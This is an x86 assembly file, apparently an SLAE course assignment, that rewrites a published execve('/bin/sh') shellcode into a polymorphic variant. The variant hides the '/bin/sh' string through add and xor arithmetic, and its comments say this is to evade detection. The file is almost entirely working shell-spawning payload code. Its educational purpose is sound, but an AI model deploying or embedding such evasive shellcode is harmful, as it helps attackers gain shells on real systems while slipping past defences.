; SLAE-xxx 
; assigmemnt 6.1: polymorphic version of shellstorm shellcode 

; execve /bin/sh 
; http://shell-storm.org/shellcode/files/shellcode-827.php
; by Hamza Megahed 

;xor    %eax,%eax 
;push   %eax ; push 0 
;push   $0x68732f2f
;push   $0x6e69622f
;mov    %esp,%ebx 
;push   %eax ; push 0 
;push   %ebx ; 
;mov    %esp,%ecx
;mov    $0xb,%al
;int    $0x80

global _start

_start:

; this is a standard shellcode  
; we will try to avoid clear txt  "/bin/sh" 
; we will use esi and modify data  to avoid detection 
xor esi,esi; create 0 
mov edi,esi; store 0 into edi 
push esi; push 0 
; we recreate push 0x68732f2f ; 
add esi,0x68732f2f; 
push esi; 
; we recreate push 0x6e69622f ; "/bin" 
inc esi; avoid null byte in next xor 
xor esi,0x61a4d1f; XORed the value to get "/bin"  
push esi; 
; that way we dont have the classic push /sh push /bin 
mov ebx,esp; 
push edi; 
push ebx; 
mov ecx,esp ; 
; syscall 
mov al,0xb 
int 0x80 

